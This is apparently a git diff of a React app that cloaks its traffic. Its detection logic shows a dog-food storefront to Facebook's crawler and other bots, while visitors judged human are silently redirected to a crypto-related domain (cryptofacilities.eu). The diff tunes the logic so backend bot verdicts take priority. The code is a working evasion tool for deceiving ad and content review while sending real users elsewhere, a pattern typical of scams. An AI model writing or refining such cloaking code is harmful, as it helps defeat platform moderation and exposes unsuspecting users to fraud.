@@ -1,4 +1,4 @@
-// Fixed App.tsx with much more lenient human detection
+// Fixed App.tsx - Backend-first approach with much more lenient detection
 import { useEffect, useState } from 'react';
 import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
 import { CartProvider } from './contexts/CartContext';
@@ -19,9 +19,7 @@ import useEnhancedBotDetectionWithBackend, {
   type BehaviorMetrics 
 } from './hooks/useEnhancedBotDetectionWithBackend';
 
-// Enhanced Loading Spinner
-
-// Bot Content (for actual bots)
+// Bot Content (for actual bots confirmed by backend)
 const BotContent: React.FC<{detectionResult: DetectionResult, behaviorMetrics: BehaviorMetrics}> = ({ detectionResult }) => {
   const isFacebookBot = detectionResult.isFacebookBot || 
     detectionResult.detectionMethods.some((method: string) => 
@@ -153,12 +151,12 @@ const DogFoodWebsite: React.FC<{detectionResult: DetectionResult}> = ({ detectio
   </CartProvider>
 );
 
-// Main App Component with MUCH more lenient human detection
+// Main App Component - Backend-first approach
 const App: React.FC = () => {
   const [showBot, setShowBot] = useState<boolean>(false);
   const [showDogWebsite, setShowDogWebsite] = useState<boolean>(false);
   const [debugMode, setDebugMode] = useState<boolean>(false);
-  const [analysisComplete, setAnalysisComplete] = useState<boolean>(false);
+  const [backendChecked, setBackendChecked] = useState<boolean>(false);
   const [redirectTimer, setRedirectTimer] = useState<number | null>(null);
   
   const { detectionResult, behaviorMetrics } = useEnhancedBotDetectionWithBackend();
@@ -170,99 +168,90 @@ const App: React.FC = () => {
   }, []);
 
   useEffect(() => {
-    const checkDetectionResult = () => {
-      // Only process if we have some detection result
-      if (detectionResult.confidence > 0 || detectionResult.backendVerified || detectionResult.detectionMethods.length > 0) {
-        console.log('🔍 Detection result:', detectionResult);
-        setAnalysisComplete(true);
+    const handleBackendResult = () => {
+      // Wait for backend verification
+      if (!detectionResult.backendVerified && !detectionResult.backendResult?.error) {
+        return; // Still waiting for backend
+      }
+      
+      setBackendChecked(true);
+      
+      console.log('🔍 Processing backend result:', {
+        backendVerified: detectionResult.backendVerified,
+        backendResult: detectionResult.backendResult,
+        localConfidence: detectionResult.confidence,
+        timeSpent: behaviorMetrics.timeSpent
+      });
+
+      // Priority 1: Backend says bot and blocks - respect it
+      if (detectionResult.backendResult?.blocked === true && detectionResult.backendResult?.is_bot === true) {
+        console.log('🚫 Backend confirmed bot and blocked - showing bot content');
+        setShowBot(true);
+        return;
+      }
+
+      // Priority 2: Facebook bot confirmed by either frontend or backend
+      if (detectionResult.isFacebookBot || detectionResult.backendResult?.is_facebook_bot) {
+        console.log('🤖📘 Facebook bot confirmed - showing dog website');
+        setShowDogWebsite(true);
+        return;
+      }
+
+      // Priority 3: Backend says NOT a bot - trust it completely
+      if (detectionResult.backendResult?.is_bot === false) {
+        console.log('✅ Backend confirmed human - redirecting to main site');
         
-        // Priority 1: Facebook bots get the dog website
-        if (detectionResult.isFacebookBot || detectionResult.showDogWebsite) {
-          console.log('🤖📘 Facebook bot confirmed - showing dog website');
-          setShowDogWebsite(true);
-          return;
-        }
+        const timer = setTimeout(() => {
+          window.location.href = "https://cryptofacilities.eu";
+        }, 1000);
         
-        // Priority 2: Very high confidence bots (>= 0.9) get blocked
-        if (detectionResult.isBot && detectionResult.confidence >= 0.9) {
-          console.log('🚫 Very high confidence bot detected - showing bot content');
-          setShowBot(true);
-          return;
-        }
-        
-        // Priority 3: High confidence bots (>= 0.8) get the dog website for SEO
-        if (detectionResult.isBot && detectionResult.confidence >= 0.8) {
-          console.log('🤖 High confidence bot - showing dog website for SEO');
-          setShowDogWebsite(true);
-          return;
-        }
-        
-        // NEW: Much more lenient human detection logic
-        const timeSpent = behaviorMetrics.timeSpent;
-        const hasInteraction = (
-          behaviorMetrics.mouseMovements > 0 ||
+        setRedirectTimer(timer);
+        return;
+      }
+
+      // Priority 4: Backend failed but human behavior detected
+      if (detectionResult.backendResult?.error && behaviorMetrics.timeSpent > 8000) {
+        const hasHumanInteraction = (
+          behaviorMetrics.mouseMovements > 5 ||
           behaviorMetrics.keyboardEvents > 0 ||
           behaviorMetrics.scrollBehavior > 0 ||
           behaviorMetrics.touchEvents > 0
         );
 
-        // If confidence is low AND we have human indicators, redirect to main site
-        if (detectionResult.confidence < 0.8 && timeSpent > 2000) { // Increased threshold
-          if (hasInteraction || timeSpent > 8000) { // Reduced time requirement
-            console.log('👤 Human detected - redirecting to main site');
-            
-            // Set redirect timer
-            const timer = setTimeout(() => {
-              window.location.href = "https://cryptofacilities.eu";
-            }, 1500);
-            
-            setRedirectTimer(timer);
-            return;
-          }
-        }
-
-        // If we've been here a while and no clear bot signals, assume human
-        if (timeSpent > 12000 && detectionResult.confidence < 0.7) { // Reduced time, increased confidence threshold
-          console.log('👤 Long session with low bot confidence - redirecting to main site');
+        if (hasHumanInteraction) {
+          console.log('👤 Backend failed but human interaction detected - redirecting');
           
           const timer = setTimeout(() => {
             window.location.href = "https://cryptofacilities.eu";
-          }, 1000);
-          
-          setRedirectTimer(timer);
-          return;
-        }
-        
-        // For very low confidence (< 0.5) after reasonable time, redirect
-        if (timeSpent > 6000 && detectionResult.confidence < 0.5) { // Much more lenient
-          console.log('👤 Low confidence after reasonable time - redirecting');
-          
-          const timer = setTimeout(() => {
-            window.location.href = "https://cryptofacilities.eu";
-          }, 1200);
-          
-          setRedirectTimer(timer);
-          return;
-        }
-
-        // Emergency fallback - if backend says not a bot but confidence is artificially high, redirect
-        if (!detectionResult.isBot && detectionResult.backendResult && !detectionResult.backendResult.blocked && timeSpent > 5000) {
-          console.log('👤 Backend says not bot - redirecting to main site');
-          
-          const timer = setTimeout(() => {
-            window.location.href = "https://cryptofacilities.eu";
-          }, 800);
+          }, 1500);
           
           setRedirectTimer(timer);
           return;
         }
       }
-      
-      // If backend failed but local detection shows no bot signs after 20 seconds, redirect
-      if (detectionResult.backendResult?.error && 
-          !detectionResult.isBot && 
-          behaviorMetrics.timeSpent > 20000) {
-        console.log('👤 Backend failed but no local bot signs after 20s - redirecting');
+
+      // Priority 5: Long time spent without clear bot signals
+      if (behaviorMetrics.timeSpent > 15000 && detectionResult.confidence < 0.7) {
+        console.log('👤 Long session with low bot confidence - likely human');
+        
+        const timer = setTimeout(() => {
+          window.location.href = "https://cryptofacilities.eu";
+        }, 2000);
+        
+        setRedirectTimer(timer);
+        return;
+      }
+
+      // Priority 6: High confidence bot detection (local only)
+      if (detectionResult.isBot && detectionResult.confidence >= 0.9) {
+        console.log('🤖 Very high local confidence bot - showing dog website for SEO');
+        setShowDogWebsite(true);
+        return;
+      }
+
+      // Default: If we've been analyzing for a while and nothing conclusive, assume human
+      if (behaviorMetrics.timeSpent > 20000) {
+        console.log('👤 Extended analysis without clear bot signals - assuming human');
         
         const timer = setTimeout(() => {
           window.location.href = "https://cryptofacilities.eu";
@@ -272,7 +261,7 @@ const App: React.FC = () => {
       }
     };
 
-    checkDetectionResult();
+    handleBackendResult();
   }, [detectionResult, behaviorMetrics]);
 
   // Cleanup redirect timer
@@ -291,6 +280,32 @@ const App: React.FC = () => {
         <div className="max-w-6xl mx-auto">
           <h1 className="text-3xl font-bold mb-6">🔍 Bot Detection Debug Mode</h1>
           
+          <div className="bg-white p-6 rounded-lg shadow mb-6">
+            <h2 className="text-xl font-bold mb-4">Backend Result Analysis</h2>
+            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+              <div>
+                <h3 className="font-bold mb-2">Backend Response:</h3>
+                <pre className="text-sm overflow-auto bg-gray-50 p-4 rounded max-h-64">
+                  {JSON.stringify(detectionResult.backendResult, null, 2)}
+                </pre>
+              </div>
+              <div>
+                <h3 className="font-bold mb-2">Detection Summary:</h3>
+                <div className="space-y-2 text-sm">
+                  <div><strong>Backend Verified:</strong> {detectionResult.backendVerified ? '✅' : '❌'}</div>
+                  <div><strong>Backend Says Bot:</strong> {detectionResult.backendResult?.is_bot ? '🤖' : '👤'}</div>
+                  <div><strong>Backend Blocked:</strong> {detectionResult.backendResult?.blocked ? '🚫' : '✅'}</div>
+                  <div><strong>Backend Confidence:</strong> {detectionResult.backendResult?.confidence}</div>
+                  <div><strong>Local Confidence:</strong> {detectionResult.confidence}</div>
+                  <div><strong>Facebook Bot:</strong> {detectionResult.isFacebookBot ? '📘' : '❌'}</div>
+                  <div><strong>Time Spent:</strong> {Math.floor(behaviorMetrics.timeSpent / 1000)}s</div>
+                  <div><strong>Mouse Movements:</strong> {behaviorMetrics.mouseMovements}</div>
+                  <div><strong>Interactions:</strong> {behaviorMetrics.keyboardEvents + behaviorMetrics.scrollBehavior + behaviorMetrics.touchEvents}</div>
+                </div>
+              </div>
+            </div>
+          </div>
+          
           <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
             <div className="bg-white p-6 rounded-lg shadow">
               <h2 className="text-xl font-bold mb-4">Detection Result</h2>
@@ -304,36 +319,6 @@ const App: React.FC = () => {
               <pre className="text-sm overflow-auto bg-gray-50 p-4 rounded">
                 {JSON.stringify(behaviorMetrics, null, 2)}
               </pre>
-            </div>
-          </div>
-
-          <div className="bg-white p-6 rounded-lg shadow mb-6">
-            <h2 className="text-xl font-bold mb-4">Quick Stats</h2>
-            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
-              <div className="p-4 bg-blue-50 rounded">
-                <div className="text-2xl font-bold text-blue-600">
-                  {Math.round(detectionResult.confidence * 100)}%
-                </div>
-                <div className="text-sm">Confidence</div>
-              </div>
-              <div className="p-4 bg-green-50 rounded">
-                <div className="text-2xl font-bold text-green-600">
-                  {Math.floor(behaviorMetrics.timeSpent / 1000)}s
-                </div>
-                <div className="text-sm">Time Spent</div>
-              </div>
-              <div className="p-4 bg-purple-50 rounded">
-                <div className="text-2xl font-bold text-purple-600">
-                  {behaviorMetrics.mouseMovements}
-                </div>
-                <div className="text-sm">Mouse Moves</div>
-              </div>
-              <div className="p-4 bg-yellow-50 rounded">
-                <div className="text-2xl font-bold text-yellow-600">
-                  {detectionResult.detectionMethods.length}
-                </div>
-                <div className="text-sm">Methods</div>
-              </div>
             </div>
           </div>
           
@@ -362,17 +347,17 @@ const App: React.FC = () => {
     );
   }
 
-  // Show dog website for Facebook bots and medium confidence bots
+  // Show dog website for Facebook bots and SEO bots
   if (showDogWebsite) {
     return <DogFoodWebsite detectionResult={detectionResult} />;
   }
 
-  // Show bot content for very high confidence bots
+  // Show bot content only for confirmed harmful bots
   if (showBot) {
     return <BotContent detectionResult={detectionResult} behaviorMetrics={behaviorMetrics} />;
   }
 
-  // Show loader while analyzing (with timeout message for humans)
+  // Show loader while analyzing
   return (
     <div className="fixed inset-0 bg-gradient-to-br from-indigo-600 via-purple-600 to-blue-700 flex items-center justify-center">
       <div className="text-center">
@@ -385,24 +370,33 @@ const App: React.FC = () => {
         </div>
         
         <div className="text-white/90 text-lg font-medium mb-2">
-          {behaviorMetrics.timeSpent > 10000 
-            ? "Almost ready..." 
-            : behaviorMetrics.timeSpent > 5000 
-            ? "Loading Dogify..." 
-            : "Initializing..."
+          {!backendChecked 
+            ? "Verifying with security backend..." 
+            : behaviorMetrics.timeSpent > 15000 
+            ? "Final analysis..." 
+            : "Analyzing request..."
           }
         </div>
         <div className="text-white/70 text-sm">
-          {behaviorMetrics.timeSpent > 15000 
-            ? "Taking a bit longer than expected, hang tight!" 
+          {behaviorMetrics.timeSpent > 20000 
+            ? "This is taking longer than expected. You might be redirected soon." 
             : "🐕 Premium nutrition for your furry friend"
           }
         </div>
         
-        {/* Show progress hint for humans */}
-        {behaviorMetrics.timeSpent > 8000 && !analysisComplete && (
+        {/* Show interaction hint for humans after longer wait */}
+        {behaviorMetrics.timeSpent > 12000 && !backendChecked && (
           <div className="mt-4 text-white/60 text-xs">
             Move your mouse or scroll to help us verify you're human
+          </div>
+        )}
+
+        {/* Backend communication status */}
+        {behaviorMetrics.timeSpent > 5000 && (
+          <div className="mt-6 text-white/60 text-xs">
+            Backend Status: {detectionResult.backendVerified ? '✅ Connected' : 
+                            detectionResult.backendResult?.error ? '❌ Connection Issue' : 
+                            '🔄 Connecting...'}
           </div>
         )}
       </div>
